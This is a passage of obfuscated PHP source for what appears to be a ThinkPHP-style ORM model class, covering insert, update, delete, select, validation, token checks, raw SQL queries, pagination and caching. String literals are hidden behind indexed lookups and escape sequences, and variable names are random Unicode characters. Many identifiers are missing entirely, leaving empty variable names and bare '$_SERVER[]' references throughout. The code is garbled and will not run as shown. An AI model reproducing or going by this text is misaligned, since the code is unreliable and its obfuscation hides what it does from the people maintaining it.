$[$Ϸ] = $ߑ[$Ϸ]; $Ҭ¥[$ᆮѱ[319]] = $; unset($ߑ[$Ϸ]); } else { $this->error = think_lang($ᆮѱ[318]); return !1; } } if (is_array($Ҭ¥[$ᆮѱ[319]]) && isset($Ҭ¥[$ᆮѱ[319]][$Ϸ])) { $ = $Ҭ¥[$ᆮѱ[319]][$Ϸ]; } if (!1 === $this->_beforeUpdate($ߑ, $Ҭ¥)) { return !1; } $Ƨ = $this->db->update($ߑ, $Ҭ¥); if (!1 !== $Ƨ) { if (isset($)) { $ߑ[$Ϸ] = $; } $this->_afterUpdate($ߑ, $Ҭ¥); } return $Ƨ; } protected function _beforeUpdate(&$Έ, $) { } protected function _afterUpdate($, $髕) { } public function delete($Ύ = array()) { $ =& $_SERVER[]; if (empty($Ύ) && empty($this->options[$[319]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ = $this->getPk(); if (is_numeric($Ύ) || is_string($Ύ)) { if (strpos($Ύ, $[50])) { $쌊[$] = array($[320], $Ύ); } else { $쌊[$] = $Ύ; } $this->options[$[319]] = $쌊; } $Ύ = $this->_parseOptions(); if (is_array($Ύ[$[319]]) && isset($Ύ[$[319]][$])) { $ = $Ύ[$[319]][$]; } $ = $this->db->delete($Ύ); if (!1 !== $) { $ìʰ = array(); if (isset($)) { $ìʰ[$] = $; } $this->_after_delete($ìʰ, $Ύ); } return $; } protected function _after_delete($, $ɢ) { } public function select($ݲ = array()) { $Гҡ =& $_SERVER[]; if (is_string($ݲ) || is_numeric($ݲ)) { $Ʀ = $this->getPk(); if (strpos($ݲ, $Гҡ[50])) { $[$Ʀ] = array($Гҡ[320], $ݲ); } else { $[$Ʀ] = $ݲ; } $this->options[$Гҡ[319]] = $; } elseif (!1 === $ݲ) { $ݲ = $this->_parseOptions(); return $Гҡ[321] . $this->db->buildSelectSql($ݲ) . $Гҡ[322]; } $ݲ = $this->_parseOptions(); $ = $this->db->select($ݲ); if (!1 === $) { return !1; } if (empty($)) { return null; } $this->_afterSelect($, $ݲ); return $; } protected function _afterSelect(&$, $ϼ) { } public function buildSql($܃ҧ = array()) { $и =& $_SERVER[]; $܃ҧ = $this->_parseOptions($܃ҧ); return $и[321] . $this->db->buildSelectSql($܃ҧ) . $и[322]; } public function optionsValue($ = null) { if (is_null($)) { return $this->options; } elseif (is_array($)) { $this->options = array_merge($this->options, $); } } protected function _parseOptions($⮋ = array()) { $ݚ =& $_SERVER[]; if (is_array($⮋)) { $⮋ = array_merge($this->options, $⮋); } $this->options = array(); if (!isset($⮋[$ݚ[323]])) { $⮋[$ݚ[323]] = $this->getTableName(); $ž = $this->fields; } else { $ž = $this->getDbFields(); } if (!empty($⮋[$ݚ[324]])) { $⮋[$ݚ[323]] .= $ݚ[53] . $⮋[$ݚ[324]]; } $⮋[$ݚ[325]] = $this->name; if (isset($⮋[$ݚ[319]]) && is_array($⮋[$ݚ[319]]) && !empty($ž) && !isset($⮋[$ݚ[326]]) && !isset($⮋[$ݚ[323]])) { foreach ($⮋[$ݚ[319]] as $Ǌ => $) { $Ǌ = trim($Ǌ); if (in_array($Ǌ, $ž, !0)) { if (is_scalar($)) { $this->_parseType($⮋[$ݚ[319]], $Ǌ); } } elseif (!is_numeric($Ǌ) && $ݚ[11] != substr($Ǌ, 0, 1) && !1 === strpos($Ǌ, $ݚ[10]) && !1 === strpos($Ǌ, $ݚ[304]) && !1 === strpos($Ǌ, $ݚ[327]) && !1 === strpos($Ǌ, $ݚ[328])) { unset($⮋[$ݚ[319]][$Ǌ]); } } } $this->_options_filter($⮋); return $⮋; } protected function _options_filter(&$) { } protected function _parseType(&$빬, $ϓ) { $ի΍ =& $_SERVER[]; if (empty($this->options[$ի΍[329]][$ի΍[4] . $ϓ])) { $ = strtolower($this->fields[$ի΍[296]][$ϓ]); if (!1 !== strpos($, $ի΍[330])) { } elseif (!1 === strpos($, $ի΍[331]) && !1 !== strpos($, $ի΍[332])) { $빬[$ϓ] = intval($빬[$ϓ]); } elseif (!1 !== strpos($, $ի΍[333]) || !1 !== strpos($, $ի΍[334])) { $빬[$ϓ] = floatval($빬[$ϓ]); } elseif (!1 !== strpos($, $ի΍[335])) { $빬[$ϓ] = (bool) $빬[$ϓ]; } } } public function find($㸖 = array()) { $ =& $_SERVER[]; if (is_numeric($㸖) || is_string($㸖)) { $֝[$this->getPk()] = intval($㸖); $this->options[$[319]] = $֝; } $this->options[$[336]] = 1; $㸖 = $this->_parseOptions(); $ = $this->db->select($㸖); if (!1 === $) { return !1; } if (empty($)) { return null; } $this->data = $[0]; $this->_afterFind($this->data, $㸖); if (!empty($this->options[$[337]])) { return $this->returnResult($this->data, $this->options[$[337]]); } return $this->data; } protected function _afterFind(&$, $) { } protected function returnResult($ߢ, $ = '') { $ =& $_SERVER[]; if ($) { if (is_callable($)) { return call_user_func($, $ߢ); } switch (strtolower($)) { case $[338]: return json_encode($ߢ); case $[339]: return xml_encode($ߢ); } } return $ߢ; } public function parseFieldsMap($, $ƒ牆 = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ꀿ => $ܘ) { if ($ƒ牆 == 1) { if (isset($[$ܘ])) { $[$ꀿ] = $[$ܘ]; unset($[$ܘ]); } } else { if (isset($[$ꀿ])) { $[$ܘ] = $[$ꀿ]; unset($[$ꀿ]); } } } } return $; } public function setField($К, $ŗ = '') { if (is_array($К)) { $ = $К; } else { $[$К] = $ŗ; } return $this->save($); } public function setAdd($ģ, $ = 1) { $ =& $_SERVER[]; $ = $ģ . $[340] . $; if ($ < 0) { $ = $ģ . $; } return $this->setField($ģ, array($[341], $)); } public function getField($, $ƫډ = null) { $ =& $_SERVER[]; $îį[$[317]] = $; $îį = $this->_parseOptions($îį); $ = trim($); if (strpos($, $[50])) { if (!isset($îį[$[336]])) { $îį[$[336]] = is_numeric($ƫډ) ? $ƫډ : $[12]; } $Α = $this->db->select($îį); if (!empty($Α)) { $ = explode($[50], $); $ = array_keys($Α[0]); $ϻ = array_shift($); $ش = array_shift($); $؆ = array(); $ = count($); foreach ($Α as $) { $ŭ = $[$ϻ]; if (2 == $) { $؆[$ŭ] = $[$ش]; } else { $؆[$ŭ] = is_string($ƫډ) ? implode($ƫډ, $) : $; } } return $؆; } } else { if (!0 !== $ƫډ) { $îį[$[336]] = is_numeric($ƫډ) ? $ƫډ : 1; } if ($ƫډ === $[299]) { unset($îį[$[336]]); } $ = $this->db->select($îį); if (!empty($)) { if ($ƫډ === $[299]) { return reset($[0]); } if (!0 !== $ƫډ && 1 == $îį[$[336]]) { return reset($[0]); } foreach ($ as $Ȋ) { $Ĩ[] = $Ȋ[$]; } return $Ĩ; } } return null; } public function create($Ӗ = '', $ = '') { $ݐ =& $_SERVER[]; if (empty($Ӗ)) { $Ӗ = $_POST; } elseif (is_object($Ӗ)) { $Ӗ = get_object_vars($Ӗ); } if (empty($Ӗ) || !is_array($Ӗ)) { $this->error = think_lang($ݐ[315]); return !1; } $Ӗ = $this->parseFieldsMap($Ӗ, 0); $ = $ ? $ : (!empty($Ӗ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ݐ[317]])) { $͉ = $this->options[$ݐ[317]]; unset($this->options[$ݐ[317]]); } elseif ($ == THINK_MODEL_INSERT && isset($this->insertFields)) { $͉ = $this->insertFields; } elseif ($ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $͉ = $this->updateFields; } if (isset($͉)) { if (is_string($͉)) { $͉ = explode($ݐ[50], $͉); } if (think_config($ݐ[342])) { $͉[] = think_config($ݐ[343]); } foreach ($Ӗ as $ʛ => $҉) { if (!in_array($ʛ, $͉)) { unset($Ӗ[$ʛ]); } } } if (!$this->autoValidation($Ӗ, $)) { return !1; } if (!$this->autoCheckToken($Ӗ)) { $this->error = think_lang($ݐ[344]); return !1; } if ($this->autoCheckFields) { $͉ = $this->getDbFields(); foreach ($Ӗ as $ʛ => $҉) { if (!in_array($ʛ, $͉)) { unset($Ӗ[$ʛ]); } elseif (MAGIC_QUOTES_GPC && is_string($҉)) { $Ӗ[$ʛ] = stripslashes($҉); } } } $this->autoOperation($Ӗ, $); $this->data = $Ӗ; return $Ӗ; } public function autoCheckToken($ƣ) { $˧ =& $_SERVER[]; if (isset($this->options[$˧[345]]) && !$this->options[$˧[345]]) { return !0; } if (think_config($˧[342])) { $ = think_config($˧[343]); if (!isset($ƣ[$]) || Session::get($)) { return !1; } list($, $ݙƾ) = explode($˧[11], $ƣ[$]); if ($ݙƾ && Session::get($ . $˧[10] . $) === $ݙƾ) { Session::remove($ . $˧[10] . $); return !0; } if (think_config($˧[346])) { Session::remove($ . $˧[10] . $); } return !1; } return !0; } public function regex($ɜʉ, $փ) { $Ƨ =& $_SERVER[]; $԰ = array($Ƨ[347] => $Ƨ[348], $Ƨ[349] => $Ƨ[350], $Ƨ[351] => $Ƨ[352], $Ƨ[353] => $Ƨ[354], $Ƨ[355] => $Ƨ[356], $Ƨ[357] => $Ƨ[358], $Ƨ[359] => $Ƨ[360], $Ƨ[334] => $Ƨ[361], $Ƨ[362] => $Ƨ[363]); if (isset($԰[strtolower($փ)])) { $փ = $԰[strtolower($փ)]; } return preg_match($փ, $ɜʉ) === 1; } private function autoOperation(&$̑, $â) { $Ǌ =& $_SERVER[]; if (!empty($this->options[$Ǌ[364]])) { $ = $this->options[$Ǌ[364]]; unset($this->options[$Ǌ[364]]); } elseif (!empty($this->_auto)) { $ = $this->_auto; } if (isset($)) { foreach ($ as $Ћ) { if (empty($Ћ[2])) { $Ћ[2] = THINK_MODEL_INSERT; } if ($â == $Ћ[2] || $Ћ[2] == THINK_MODEL_BOTH) { switch (trim($Ћ[3])) { case $Ǌ[365]: case $Ǌ[366]: $엚 = isset($Ћ[4]) ? (array) $Ћ[4] : array(); if (isset($̑[$Ћ[0]])) { array_unshift($엚, $̑[$Ћ[0]]); } if ($Ǌ[365] == $Ћ[3]) { $̑[$Ћ[0]] = call_user_func_array($Ћ[1], $엚); } else { $̑[$Ћ[0]] = call_user_func_array(array(&$this, $Ћ[1]), $엚); } break; case $Ǌ[317]: $̑[$Ћ[0]] = $̑[$Ћ[1]]; break; case $Ǌ[367]: if ($Ǌ[12] === $̑[$Ћ[0]]) { unset($̑[$Ћ[0]]); } break; case $Ǌ[368]: default: $̑[$Ћ[0]] = $Ћ[1]; } if (!1 === $̑[$Ћ[0]]) { unset($̑[$Ћ[0]]); } } } } return $̑; } protected function autoValidation($։, $¿) { $ =& $_SERVER[]; if (!empty($this->options[$[369]])) { $ѽ = $this->options[$[369]]; unset($this->options[$[369]]); } elseif (!empty($this->_validate)) { $ѽ = $this->_validate; } if (isset($ѽ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ѽ as $ => $Ҏ) { if (empty($Ҏ[5]) || $Ҏ[5] == THINK_MODEL_BOTH || $Ҏ[5] == $¿) { if (0 == strpos($Ҏ[2], $[370]) && strpos($Ҏ[2], $[371])) { $Ҏ[2] = think_lang(substr($Ҏ[2], 2, -1)); } $Ҏ[3] = isset($Ҏ[3]) ? $Ҏ[3] : THINK_EXISTS_VALIDATE; $Ҏ[4] = isset($Ҏ[4]) ? $Ҏ[4] : $[372]; switch ($Ҏ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($։, $Ҏ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($[12] != trim($։[$Ҏ[0]])) { if (!1 === $this->_validationField($։, $Ҏ)) { return !1; } } break; default: if (isset($։[$Ҏ[0]])) { if (!1 === $this->_validationField($։, $Ҏ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ě, $) { if (!1 === $this->_validationFieldItem($ě, $)) { if ($this->patchValidate) { $this->error[$[0]] = $[2]; } else { $this->error = $[2]; return !1; } } return; } protected function _validationFieldItem($, $݃) { $ =& $_SERVER[]; switch (strtolower(trim($݃[4]))) { case $[365]: case $[366]: $蠔 = isset($݃[6]) ? (array) $݃[6] : array(); if (is_string($݃[0]) && strpos($݃[0], $[50])) { $݃[0] = explode($[50], $݃[0]); } if (is_array($݃[0])) { foreach ($݃[0] as $آ) { $ַח[$آ] = $[$آ]; } array_unshift($蠔, $ַח); } else { array_unshift($蠔, $[$݃[0]]); } if ($[365] == $݃[4]) { return call_user_func_array($݃[1], $蠔); } else { return call_user_func_array(array(&$this, $݃[1]), $蠔); } case $[373]: return $[$݃[0]] == $[$݃[1]]; case $[374]: if (is_string($݃[0]) && strpos($݃[0], $[50])) { $݃[0] = explode($[50], $݃[0]); } $Ȯ = array(); if (is_array($݃[0])) { foreach ($݃[0] as $آ) { $Ȯ[$آ] = $[$آ]; } } else { $Ȯ[$݃[0]] = $[$݃[0]]; } if (!empty($[$this->getPk()])) { $Ȯ[$this->getPk()] = array($[375], $[$this->getPk()]); } if ($this->where($Ȯ)->find()) { return !1; } return !0; default: return $this->check($[$݃[0]], $݃[1], $݃[4]); } } public function check($ȑ㝋, $ͬ, $ = "\x72\145\147\x65\x78") { $ =& $_SERVER[]; $ = strtolower(trim($)); switch ($) { case $[7]: case $[376]: $ߣ = is_array($ͬ) ? $ͬ : explode($[50], $ͬ); return $ == $[7] ? in_array($ȑ㝋, $ߣ) : !in_array($ȑ㝋, $ߣ); case $[377]: case $[378]: if (is_array($ͬ)) { $ϟ = $ͬ[0]; $ʂź = $ͬ[1]; } else { list($ϟ, $ʂź) = explode($[50], $ͬ); } return $ == $[377] ? $ȑ㝋 >= $ϟ && $ȑ㝋 <= $ʂź : $ȑ㝋 < $ϟ || $ȑ㝋 > $ʂź; case $[379]: case $[380]: return $ == $[379] ? $ȑ㝋 == $ͬ : $ȑ㝋 != $ͬ; case $[381]: $Т = mb_strlen($ȑ㝋, $[382]); if (strpos($ͬ, $[50])) { list($ϟ, $ʂź) = explode($[50], $ͬ); return $Т >= $ϟ && $Т <= $ʂź; } else { return $Т == $ͬ; } case $[383]: list($, $嫎) = explode($[50], $ͬ); if (!is_numeric($)) { $ = strtotime($); } if (!is_numeric($嫎)) { $嫎 = strtotime($嫎); } return NOW_TIME >= $ && NOW_TIME <= $嫎; case $[384]: return in_array(get_client_ip(), explode($[50], $ͬ)); case $[385]: return !in_array(get_client_ip(), explode($[50], $ͬ)); case $[372]: default: return $this->regex($ȑ㝋, $ͬ); } } public function query($ʫ, $ݗ = false) { $ =& $_SERVER[]; if (!is_bool($ݗ) && !is_array($ݗ)) { $ݗ = func_get_args(); array_shift($ݗ); } $ʫ = str_replace(array($[246], $[386]), $[53], $ʫ); $ʫ = $this->parseSql($ʫ, $ݗ); return $this->db->query($ʫ); } public function execute($, $ = false) { if (!is_bool($) && !is_array($)) { $ = func_get_args(); array_shift($); } $ = $this->parseSql($, $); return $this->db->execute($); } protected function parseSql($, $߈) { $ե =& $_SERVER[]; if (!0 === $߈) { $Ԛ = $this->_parseOptions(); $ = $this->db->parseSql($, $Ԛ); } elseif (is_array($߈)) { $߈ = array_map(array($this->db, $ե[387]), $߈); $ = vsprintf($, $߈); } else { $ = strtr($, array($ե[388] => $this->getTableName(), $ե[389] => think_config($ե[288]))); } $this->db->setModel($this->name); return $; } public function db($ = '', $㨹 = '', $ = array()) { $ =& $_SERVER[]; if ($[12] === $ && $this->db) { return $this->db; } static $ҳ = array(); static $ = array(); if (!isset($[$]) || isset($[$]) && $㨹 && $ҳ[$] != $㨹) { if (!empty($㨹) && is_string($㨹) && !1 === strpos($㨹, $[8])) { $㨹 = think_config($㨹); } $ = think_guid($㨹); $[$] = Db::getInstance($㨹); } elseif (NULL === $㨹) { $[$]->close(); unset($[$]); return; } if (!empty($)) { if (is_string($)) { parse_str($, $); } foreach ($ as $ͤ => $) { $this->setProperty($ͤ, $); } } $ҳ[$] = $㨹; $this->db = $[$]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ = get_class($this); if ($ == $_SERVER[][390]) { return $this->name; } $this->name = substr($, 0, -5); } return $this->name; } public function getTableName() { $ =& $_SERVER[]; if (empty($this->trueTableName)) { $ϖ = !empty($this->tablePrefix) ? $this->tablePrefix : $[12]; if (!empty($this->tableName)) { $ϖ .= $this->tableName; } else { $ϖ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ϖ); } return (!empty($this->dbName) ? $this->dbName . $[10] : $[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ =& $_SERVER[]; return isset($this->fields[$[295]]) ? $this->fields[$[295]] : $this->pk; } public function getDbFields() { $ =& $_SERVER[]; if (isset($this->options[$[323]])) { $ = $this->db->getFields($this->options[$[323]]); return $ ? array_keys($) : !1; } if ($this->fields) { $ = $this->fields; unset($[$[294]], $[$[295]], $[$[296]], $[$[293]]); return $; } return !1; } public function data($֊۴ = '') { $篨 =& $_SERVER[]; if ($篨[12] === $֊۴ && !empty($this->data)) { return $this->data; } if (is_object($֊۴)) { $֊۴ = get_object_vars($֊۴); } elseif (is_string($֊۴)) { parse_str($֊۴, $֊۴); } elseif (!is_array($֊۴)) { think_exception(think_lang($篨[315])); } $this->data = $֊۴; return $this; } public function join($ó) { $啓 =& $_SERVER[]; if (is_array($ó)) { $this->options[$啓[326]] = $ó; } elseif (!empty($ó)) { $this->options[$啓[326]][] = $ó; } return $this; } public function union($, $܁ = false) { $Օꅐ =& $_SERVER[]; if (empty($)) { return $this; } if ($܁) { $this->options[$Օꅐ[391]][$Օꅐ[392]] = !0; } if (is_object($)) { $ = get_object_vars($); } if (is_string($)) { $Ρ = $; } elseif (is_array($)) { if (isset($[0])) { $this->options[$Օꅐ[391]] = array_merge($this->options[$Օꅐ[391]], $); return $this; } else { $Ρ = $; } } else { think_exception(think_lang($Օꅐ[315])); } $this->options[$Օꅐ[391]][] = $Ρ; return $this; } public function cache($﹈ = true, $捛 = null, $ = '') { $瑇 =& $_SERVER[]; if (!1 !== $﹈) { $this->options[$瑇[393]] = array($瑇[94] => $﹈, $瑇[383] => $捛, $瑇[33] => $); } return $this; } public function field($, $ = false) { $ =& $_SERVER[]; if (!0 === $) { $ = $this->getDbFields(); $ = $ ? $ : $[203]; } elseif ($) { if (is_string($)) { $ = explode($[50], $); } $ = $this->getDbFields(); $ = $ ? array_diff($, $) : $; } $this->options[$[317]] = $; return $this; } public function scope($կњ = '', $Řܢ = NULL) { $ =& $_SERVER[]; if ($[12] === $կњ) { if (isset($this->_scope[$[37]])) { $Ԁ = $this->_scope[$[37]]; } else { return $this; } } elseif (is_string($կњ)) { $Č = explode($[50], $կњ); $Ԁ = array(); foreach ($Č as $͇) { if (!isset($this->_scope[$͇])) { continue; } $Ԁ = array_merge($Ԁ, $this->_scope[$͇]); } if (!empty($Řܢ) && is_array($Řܢ)) { $Ԁ = array_merge($Ԁ, $Řܢ); } } elseif (is_array($կњ)) { $Ԁ = $կњ; } if (is_array($Ԁ) && !empty($Ԁ)) { $this->options = array_merge($this->options, array_change_key_case($Ԁ)); } return $this; } public function where($ɇ, $ = null) { $ =& $_SERVER[]; if (!is_null($) && is_string($ɇ)) { if (!is_array($)) { $ = func_get_args(); array_shift($); } $ = array_map(array($this->db, $[387]), $); $ɇ = vsprintf($ɇ, $); } elseif (is_object($ɇ)) { $ɇ = get_object_vars($ɇ); } elseif (is_array($ɇ)) { foreach ($ɇ as $ӭ => $) { if ((is_numeric($ӭ) || !$ӭ) && is_string($)) { if (strpos($, $[394]) === 0) { continue; } think_trace($[395], $[12], $[49]); die; } } } if (is_string($ɇ) && $[12] != $ɇ) { $ˡ = array(); $ˡ[$[396]] = $ɇ; $ɇ = $ˡ; } if (isset($this->options[$[319]])) { $this->options[$[319]] = array_merge($this->options[$[319]], $ɇ); } else { $this->options[$[319]] = $ɇ; } return $this; } public function limit($, $Ʌ = null) { $߅ =& $_SERVER[]; $this->options[$߅[336]] = is_null($Ʌ) ? $ : $ . $߅[50] . $Ʌ; return $this; } public function page($, $Κ = null) { $ =& $_SERVER[]; $this->options[$[397]] = is_null($Κ) ? $ : $ . $[50] . $Κ; return $this; } public function comment($) { $this->options[$_SERVER[][398]] = $; return $this; } public function setProperty($, $) { if (property_exists($this, $)) { $this->{$} = $; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\x74\54\x75\x70\144\141\x74\x65", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x63\x72\145\141\x74\145\x54\151\155\145", "\164\151\x6d\x65", "\x69\156\163\145\162\164", "\146\165\x6e\143\164\151\157\156")); public function setDataAuto($̠) { $this->dataAuto = $̠; } public function __construct($ = '', $ = '', $Ԧӝ = '') { parent::__construct($, $, $Ԧӝ); } protected $tableMeta = array(); protected function _beforeInsert(&$, $) { $ʆ =& $_SERVER[]; if (!$this->checkDataAutoHas($ʆ[399])) { return; } $this->dataBeforeFilter($, $ʆ[399]); } protected function _beforeUpdate(&$, $) { $ =& $_SERVER[]; if (!$this->checkDataAutoHas($[400])) { return; } $this->dataBeforeFilter($, $[400]); } protected function _afterSelect(&$٤, $) { if (!is_array($٤)) { return; } if (!$this->checkDataAutoHas($_SERVER[][401])) { return; } foreach ($٤ as &$פߔ) { $this->dataAfterFilter($פߔ); } unset($פߔ); } protected function _afterFind(&$, $٥) { if (!is_array($)) { return; } if (!$this->checkDataAutoHas($_SERVER[][401])) { return; } $this->dataAfterFilter($); } public static function textEncode($ᒜ) { if (!$ᒜ) { return $ᒜ; } $¡ = json_encode($ᒜ); $¡ = preg_replace_callback($_SERVER[][402], function ($Ҥ̻) { return addslashes($Ҥ̻[0]); }, $¡); return json_decode($¡); } public static function textDecode($Ѭ) { $ =& $_SERVER[]; $ = json_encode($Ѭ); $ = preg_replace_callback($[403], function ($ש) { return $_SERVER[][97]; }, $); return json_decode($); } public function setAutoIncrement($啐) { $ۑ = array($this->getPk() => $啐); $ҏ = $this->data($ۑ)->add(); if ($ҏ) { $this->delete($ҏ); } } public function getAutoIncrement() { $А = $this->getTableName(); $ֶ = $this->max($this->getPk()); $ = $this->query("\163\x68\157\167\x20\x74\141\142\154\x65\x20\163\164\x61\x74\x75\163\40\x77\x68\x65\162\x65\40\x4e\141\x6d\x65\x3d\47{$А}\x27"); $ = $[0][$_SERVER[][404]]; $ = max($ֶ, $); return $; } protected function _callBefore($, $Ц) { return $this->cacheCallCheck($, $Ц, !1); } protected function _callAfter($, $ň) { return $this->cacheCallCheck($, $ň, !0); } protected function cacheFunctionAlias($ե) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ɟ, $, $ = false) { $ = $this->cacheFunctionAlias($); if (!$) { return; } foreach ($ as $ => $ߴ) { $򟶷 = $ߴ[0]; $ = explode($_SERVER[][50], $ߴ[1]); if ($ɟ == $) { return $this->cacheFunctionGet($, $򟶷); } if ($ && in_array($ɟ, $)) { $this->cacheFunctionClear($, $򟶷); } } } public function cacheFunctionGet($, $ᢅ) { $Ѩ = $this->cacheKeyMake($, $ᢅ); $ = Cache::get($Ѩ); if (!is_array($)) { $ = call_user_func_array(array($this, $), array($ᢅ, !0)); Cache::set($Ѩ, $); } return $; } public function cacheFunctionClear($, $) { $ = $; if (!is_array($)) { $ = array($); } foreach ($ as $) { $Ϊ = $this->cacheKeyMake($, $); Cache::remove($Ϊ); } } private function cacheKeyMake($, $) { $ =& $_SERVER[]; return get_class($this) . $[11] . $ . $[405] . $; } protected function selectPageReset() { $ފ =& $_SERVER[]; if (isset($GLOBALS[$ފ[406]])) { return; } $GLOBALS[$ފ[406]] = isset($GLOBALS[$ފ[7]][$ފ[407]]) ? $GLOBALS[$ފ[7]][$ފ[407]] : !1; $GLOBALS[$ފ[408]] = isset($GLOBALS[$ފ[7]][$ފ[397]]) ? $GLOBALS[$ފ[7]][$ފ[397]] : !1; $GLOBALS[$ފ[7]][$ފ[407]] = !1; $GLOBALS[$ފ[7]][$ފ[397]] = !1; } protected function selectPageRestore() { $ɀ =& $_SERVER[]; if (!isset($GLOBALS[$ɀ[406]])) { return; } $GLOBALS[$ɀ[7]][$ɀ[407]] = $GLOBALS[$ɀ[406]]; $GLOBALS[$ɀ[7]][$ɀ[397]] = $GLOBALS[$ɀ[408]]; if ($GLOBALS[$ɀ[7]][$ɀ[407]] === !1) { unset($GLOBALS[$ɀ[7]][$ɀ[407]]); } if ($GLOBALS[$ɀ[7]][$ɀ[397]] === !1) { unset($GLOBALS[$ɀ[7]][$ɀ[397]]); } unset($GLOBALS[$ɀ[406]]); unset($GLOBALS[$ɀ[408]]); } protected function selectPage($ = 200, $ɳ = 1) { $学 =& $_SERVER[]; global $in; $鳳 = $this->optionsValue(); $ޞ = 50000; $ = isset($in[$学[407]]) && $in[$学[407]] ? $in[$学[407]] : $; if ($ === -1) { $in[$学[407]] = !1; $ޞ = 100000000; $ = $ޞ; } $ף = $鳳; $ף[$学[409]] = array(); $ = intval($); $ = $ <= 5 ? 5 : ($ >= $ޞ ? $ޞ : $); $ɳ = intval(isset($in[$学[397]]) && $in[$学[397]] ? $in[$学[397]] : $ɳ); $ɳ = $ɳ <= 1 ? 1 : $ɳ; $΍ = array(); $ = 1; if ($ɳ == 1 && $) { $this->optionsValue($鳳); $΍ = $this->page($ɳ, $)->select(); $ = is_array($΍) ? count($΍) : 0; if ($ < $) { $ = 1; } else { $this->optionsValue($ף); $ = intval($this->count()); $ = ceil($ / $); } } else { $this->optionsValue($ף); $ = intval($this->count()); $ = ceil($ / $); $ɳ = $ɳ >= $ ? $ : $ɳ; $this->optionsValue($鳳); $΍ = $this->page($ɳ, $)->select(); } if (!is_array($΍)) { $΍ = array(); } if ($ == 1) { $ = count($΍); } $ = array($学[410] => array($学[411] => $, $学[407] => $, $学[397] => $ɳ, $学[412] => $), $学[413] => $΍); return $; } protected function checkLength($豥, $ = 0, $Բ = '') { $ב =& $_SERVER[]; $ = $ ? $ : 65536; if (!$豥 || strlen($豥) < $) { return; } $Բ = $Բ ? $Բ . $ב[71] : $ב[12]; show_json($Բ . LNG($ב[414]) . "\50{$}\x29", !1); } protected function metaSet($ې쓱, $Ɠ = null, $ҩ = null) { $֊ =& $_SERVER[]; if (!$this->tableMeta || !$ې쓱) { return !1; } $鮑 = $this->tableMeta[$֊[415]]; $ = $this->tableMeta[$֊[416]]; $ = Model($); $۪ = array($鮑 => $ې쓱, $֊[417] => $Ɠ); if (is_null($Ɠ)) { return $->where(array($鮑 => $ې쓱))->delete(); } if (is_null($ҩ) && is_string($Ɠ)) { return $->where($۪)->delete(); } $ = is_array($Ɠ) ? $Ɠ : array(); if (is_string($Ɠ)) { $[$Ɠ] = $ҩ; } $ = array(); foreach ($ as $ => $Ƶ) { if (is_null($Ƶ) && is_string($)) { $->where(array($鮑 => $ې쓱, $֊[417] => $))->delete(); continue; } $this->checkLength($Ƶ, !1, $ . $֊[4] . $); $[] = array($鮑 => $ې쓱, $֊[94] => $, $֊[418] => $Ƶ); } $ߙ = $֊[419] . $; CacheLock::lock($ߙ); $->where(array($鮑 => $ې쓱))->addAll($, array(), !0); CacheLock::unlock($ߙ); return !0; } public function metaGet($ȵ, $׼ = false) { $򕎽 =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $׾ = $this->tableMeta[$򕎽[415]]; $ = Model($this->tableMeta[$򕎽[416]]); if ($׼) { $ŕ = array($׾ => $ȵ, $򕎽[94] => $׼); return $->where($ŕ)->getField($򕎽[418]); } $ŕ = array($׾ => $ȵ); $ˬ = $->field($򕎽[420])->where($ŕ)->select(); $ˬ = array_to_keyvalue($ˬ, $򕎽[94], $򕎽[418]); return $ˬ; } private function checkDataAutoHas($˹г) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ԟ) { if (in_array($˹г, explode($_SERVER[][50], $Ԟ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$, $ɻ) { $ƻ =& $_SERVER[]; if (!is_array($)) { return; } foreach ($this->dataAuto as $) { $ = $[0]; if (!in_array($ɻ, explode($ƻ[50], $[2]))) { continue; } switch (trim($[3])) { case $ƻ[365]: case $ƻ[366]: $ϻؐ = $[1]; $ = isset($[4]) ? (array) $[4] : array(); if ($ϻؐ == $ƻ[194] && array_key_exists($, $)) { if (!$[$]) { unset($[$]); } break; } if (isset($[$])) { array_unshift($, $[$]); } if ($ƻ[365] == $[3]) { $[$] = call_user_func_array($ϻؐ, $); } else { $[$] = call_user_func_array(array(&$this, $ϻؐ), $); } break; case $ƻ[314]: if (isset($[$]) && $[$]) { $[$] = call_user_func_array(array(&$this, $[1]), array($[$])); } break; case $ƻ[317]: $[$] = $[$[1]]; break; case $ƻ[338]: if (isset($[$]) && !is_string($[$])) { $[$] = json_encode_force($[$]); } break; case $ƻ[367]: if ($[$] === $ƻ[12]) { unset($[$]); } break; case $ƻ[368]: $[$] = $[1]; default: break; } } if ($ɻ == $ƻ[399]) { $Ғ = strtolower($this->db->getDbType()); if (strpos($Ғ, $ƻ[13]) !== 0) { return; } $ = $this->field(!0)->fields; $Ȫե = $[$ƻ[296]]; if (isset($[$ƻ[295]])) { unset($Ȫե[$[$ƻ[295]]]); } foreach ($Ȫե as $ => $ɻ) { if (!isset($[$])) { $[$] = $ƻ[12]; } } } } private function 